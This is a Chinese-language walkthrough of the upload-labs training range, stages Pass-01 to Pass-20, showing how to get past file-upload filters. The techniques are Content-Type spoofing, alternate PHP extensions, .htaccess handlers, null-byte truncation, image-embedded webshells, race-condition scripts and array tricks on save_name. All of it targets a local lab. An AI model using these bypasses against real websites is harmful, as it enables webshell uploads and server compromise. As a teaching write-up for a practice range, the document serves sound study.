---
title: upload-labs文件上传
author: jh2ng
cover: 'http://image.jh2ing.com/image-20221203141713361.png'
tags:
  - Web安全
categories:
  - 靶场
abbrlink: 44707
date: 2022-12-02 18:00:00
---

#### Pass-01

前端js限制文件上传类型，只需要绕过js即可上传文件

1. 利用burp的proxy模块，移除所有js文件
2. 禁用js脚本
3. 修改前端源码，删除js代码

直接演示第三种方法，将源码拷贝到新的html文件

```html
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
    <p>请选择要上传的图片：<p>
    <input class="input_file" type="file" name="upload_file"/>
    <input class="button" type="submit" name="submit" value="上传"/>
 </form>
```

修改源码文件，action选项可以先上传一张正常的图片，查看请求的url

```html
<form action= "图片提交地址" enctype="multipart/form-data" method="post"">
    <p>请选择要上传的图片：<p>
    <input class="input_file" type="file" name="upload_file"/>
    <input class="button" type="submit" name="submit" value="上传"/>
</form>
```

然后打开html上传文件即可上传成功。

#### Pass-02

首先了解一下MIME是什么？

MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。

每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。

如：`PNG图像 .png image/png`

服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用`Content-type`关键字进行定义。

`Content-type: text/html`

通过源码发现服务器端只是通过`Content-type`类型来判断是否是图片文件

```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
	$temp_file = $_FILES['upload_file']['tmp_name'];
	$img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
	if (move_uploaded_file($temp_file, $img_path)) {
		$is_upload = true;
	} else {
		$msg = '上传出错！';
	}
} else {
	$msg = '文件类型不正确，请重新上传！';
}
```

所以只需要修改`Content-type`类型就可以上传webshell

![image-20221122173942960](http://image.jh2ing.com/image-20221122173942960.png)

修改为`Content-Type: image/jpeg`，可以发现php.php文件上传成功。

![image-20221122174209548](http://image.jh2ing.com/image-20221122174209548.png)

#### Pass-03

当apache的配置文件httpd.conf中存在如下配置时：

```
AddType application/x-httpd-php .php .phtml .phps .php5 .pht
```

说明可以通过上传`.phtml|.phps|.php5|.pht`这些后缀名的文件，且他们都会被解析称后缀为`.php`的文件。所以可以尝试使用上传`xxx.php5`这类的文件进行绕过。

> 注意phpstudy集成环境版本问题，AddType添加不生效解决办法，nts不解析，需要phpts版本。
>
> `https://www.cnblogs.com/Article-kelp/p/14927087.html`
>
> 推荐使用`https://github.com/c0ny1/upload-labs/releases`

使用burp修改文件后缀或者直接重命名文件更改后缀后上传

![image-20221122184924852](http://image.jh2ing.com/image-20221122184924852.png)

#### Pass-04

.htaccess文件(或者"分布式配置文件"）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。

> 需要注意，.htaccess文件的作用域为其所在目录与其所有的子目录，若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。

`.htaccess`参数

```
AddHandler php5-script .jpg
AddType application/x-httpd-php .jpg
Sethandler application/x-httpd-php
```

`Sethandler` 将该目录及子目录的所有文件均映射为php文件类型。
`Addhandler` 使用 php5-script 处理器来解析所匹配到的文件。
`AddType` 将特定扩展名文件映射为php文件类型。

编辑`.htaccess`文件

```
SetHandler application/x-httpd-php
```

图片马

```
copy init.jpg/b + php.php horse.jpg
```

两个文件上传之后，复制图片地址并连接

![image-20221123145853222](http://image.jh2ing.com/image-20221123145853222.png)

#### Pass-05

限制了`.htaccess`文件，没有限制大小写

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
```

使用burp抓包修改或者直接更改后缀名即可绕过。

![image-20221123150505650](http://image.jh2ing.com/image-20221123150505650.png)

#### Pass-06

查看源码发现没首尾去空

```php
$file_ext = trim($file_ext); //首尾去空
```

使用burp添加空格

![image-20230104102233905](http://image.jh2ing.com/image-20230104102233905.png)

然后成功访问

![image-20221123181138209](http://image.jh2ing.com/image-20221123181138209.png)

#### Pass-07

利用Windows特性，没有对文件末尾的点做限制，上传之后Windows会自动去掉点

```php
$file_name = deldot($file_name);//删除文件名末尾的点
```

使用burp抓包，在文件名后缀上添加`.`

![image-20221123182131697](http://image.jh2ing.com/image-20221123182131697.png)

然后浏览器访问此路径

![image-20221123182328627](http://image.jh2ing.com/image-20221123182328627.png)

#### Pass-08

没有对后缀名进行去`::$DATA`处理，利用windows特性，可在后缀名中加` ::$DATA`绕过

```php
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

![image-20221124120729264](http://image.jh2ing.com/image-20221124120729264.png)

![image-20221124120629042](http://image.jh2ing.com/image-20221124120629042.png)

#### Pass-09

```php
$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空

$temp_file = $_FILES['upload_file']['tmp_name'];
$img_path = UPLOAD_PATH.'/'.$file_name;
```

通过源码发现，之前是随机生成文件名拼接文件后缀`$img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;`，而此处是直接拼接`$file_name`，只要上传的文件名满足在`$file_ext`过滤之后不在下面的黑名单里且`$file_name`是php文件。

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
```

`deldot()`函数会删除文件名末尾的点，连续的点都会被去除，`strrchr()`函数会截取文件后缀名。

```
test.php. .
deldot()之后： test.php. 
strrchr()截取后： .
```

此时`$file_ext = .`不在黑名单之内，且`$file_name = test.php.   `，windows特性会去除最后的`.`，最后上传之后最终变成`/upload/test.php`

本地测试

![image-20221124142139096](http://image.jh2ing.com/image-20221124142139096.png)

使用burp更改后缀

![image-20221124141656276](http://image.jh2ing.com/image-20221124141656276.png)

![image-20221124141841881](http://image.jh2ing.com/image-20221124141841881.png)

#### Pass-10

```
$file_name = str_ireplace($deny_ext,"", $file_name);
```

将上传的文件名含有黑名单里的关键字全替换为空，使用双写绕过

![image-20221124150608222](http://image.jh2ing.com/image-20221124150608222.png)

因为文件名也含有php，所以被去掉了

![image-20221124150655440](http://image.jh2ing.com/image-20221124150655440.png)

#### Pass-11

```
$ext_arr = array('jpg','png','gif')
```

只允许的文件后缀，此处上传目录可控，可采用00截断。

**00截断原理**

00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。
```
# 上传一个普通文件
/upload/test.txt
# 00截断 %00是0在url编码后的内容
/upload/test.php%00.txt
```

白名单会识别到正常的`txt`后缀，但是操作系统在读取到`\0`时就会结束，从而变成了`/upload/test.php`。

php环境00截断要求：php版本小于5.3.29

![image-20221125153354703](http://image.jh2ing.com/image-20221125153354703.png)

#### Pass-12

和Pass-11一样，不过此处使用了POST请求，GET请求可以直接在url上加上`%00`会自动解码

拼接上传路径

>这是在php后面写1是因为在hex下好快速寻找修改位置

![image-20221125154945391](http://image.jh2ing.com/image-20221125154945391.png)

找到`1`这个位置

![image-20221125155243166](http://image.jh2ing.com/image-20221125155243166.png)

修改为`00`

![image-20221125155309625](http://image.jh2ing.com/image-20221125155309625.png)

上传成功

![image-20221125155349835](http://image.jh2ing.com/image-20221125155349835.png)

#### Pass-13

上传文件会通过读取文件头来判断是什么类型的文件，什么是文件头？每个文件都要一个特定的标识，比如txt文件和jpg文件，系统通过读取文件头来判断此文件属于什么类型。此处有文件包含，可以制作图片马上传。

```
常见的文件头
 JPEG (jpg)，文件头：FFD8FF
 PNG (png)，文件头：89504E47
 GIF (gif)，文件头：47494638
 TIFF (tif)，文件头：49492A00
 Windows Bitmap (bmp)，文件头：424D
```

制作图片马

```
copy init.jpg/b + phpinfo.php horse.jpg
```

上传图片后利用文件包含漏洞加载图片马

![image-20221125182410432](http://image.jh2ing.com/image-20221125182410432.png)

#### Pass-14

使用 `getimagesize()`函数来获取文件信息，方法和Pass-13一样

#### Pass-15

使用`php_exif模块`来检测，也可以和Pass-13一样，原理和检测文件头类似，可以直接在php文件中添加关键字`GIF89a`,把后缀名修改成gif

![image-20221125184711545](http://image.jh2ing.com/image-20221125184711545.png)

利用文件包含漏洞访问

![image-20221125184739657](http://image.jh2ing.com/image-20221125184739657.png)

#### Pass-16

判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。

![image-20221201141903796](http://image.jh2ing.com/image-20221201141903796.png)

通过对比上传前后的图片，发现后面的位置已经发生改变，在没有发生改变的位置插入webshell

![image-20221201153843612](http://image.jh2ing.com/image-20221201153843612.png)

上传成功之后利用文件包含漏洞访问。

![image-20221201153915116](http://image.jh2ing.com/image-20221201153915116.png)

以下参考其他类型图片

> https://xz.aliyun.com/t/2657#toc-1

#### Pass-17

主要测试条件竞争，对于非法文件进行了删除操作，服务器对文件的读取和删除包括代码执行都需要时间，在这一小段时间内，文件仍然存在于服务器上，你就可以进行触发等操作。

编写`compete.php`

```php
<?php fputs(fopen('bin.php','w'),'<?php phpinfo(); ?>');?>
```

burp抓取上传数据包到intruder模块

![image-20221201160130490](http://image.jh2ing.com/image-20221201160130490.png)

设置payload

![image-20221201160331159](http://image.jh2ing.com/image-20221201160331159.png)

设置线程200

![image-20221201160439994](http://image.jh2ing.com/image-20221201160439994.png)

![image-20221201160404927](http://image.jh2ing.com/image-20221201160404927.png)

然后编写脚本来访问

```python
while True:
    response = requests.get("http://192.168.73.139/upload/compete.php")
    code = response.status_code
    if code == 200:
        print("OK")
        break
    else:
        print("NO")
```

多次访问之后发现状态码返回200，说明已经成功执行了php文件

![image-20221201161911017](http://image.jh2ing.com/image-20221201161911017.png)

直接访问webshell创建的php文件

> 返回状态码200有时候可能没有创建成功，可以把break删除，或者统计多个来结束

![image-20221201162234066](http://image.jh2ing.com/image-20221201162234066.png)

#### Pass-18

同样也是条件竞争，只是限制了php文件上传，上传之后重命名，这里使用图片马上传，在重命名时使用条件竞争的方法。

制作图片马

```
copy 1.jpg/b + compete.php test01.jpg
```

然后按照上面的方法进行，这里注意的是上传路径不在upload里面，一切以环境正常上传路径为主，我正常上传重名后图片的地址为`http://192.168.73.139/upload1669884432.jpg`

编写python脚本

```python
import requests

while True:
    response = requests.get("http://192.168.73.139/include.php?file=uploadtest01.jpg")
    text = response.text
    if "Warning" not in text:
        print("OK")
```

![image-20221201165300919](http://image.jh2ing.com/image-20221201165300919.png)

#### Pass-19

用户自定义文件名，通过源码发现用户输入的文件名后缀根据黑名单来进行限制，所以这里直接可以用大写的`PHP`进行绕过。

![image-20221202165316590](http://image.jh2ing.com/image-20221202165316590.png)

后面在文件路径拼接中，也可以使用00截断绕过。

![image-20221202170027322](http://image.jh2ing.com/image-20221202170027322.png)

#### Pass-20

判断保存名称是否为空，如果为空就用原图片名，否则用保存名称；`strtolower()`函数将文件名全部变成小写，` explode()`函数通过`.`来将文件名分成数组

```php
 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
```

`end()`获取数组中最后的元素，也就是后缀名来判断是否是图片

```php
 $ext = end($file);
 $allow_suffix = array('jpg','png','gif');
 if (!in_array($ext, $allow_suffix)) {
     $msg = "禁止上传该后缀文件!";
 }
```

`reset()`函数获取文件名，`count()`函数获取数组元素个数来获取后缀

```php
$file_name = reset($file) . '.' . $file[count($file) - 1];
```

结果

```
Array ( [0] => test [1] => jpg )
test.jpg
```

，自己构造数组绕过，`count()`函数获取数组元素个数

```
test.php.jpg

Array ( [0] => test.php [1] => jpg )
test.php.jpg
```

把test.php保留，去除jpg，绕过`$file[count($file) - 1]`即`$file[count($file) - 1] `置空

```
$file[0] = "test.php";
$file[2] = "jpg";

Array ( [0] => test.php [2] => jpg )
test.php.
```

通过`move_uploaded_file`函数把点去掉，`move_uploaded_file`会自动去掉末尾的`/`

```
save_name[0] = test.php/
save_name[2] = jpg
```

构造数据包发送上传成功。

![image-20221202180825799](http://image.jh2ing.com/image-20221202180825799.png)
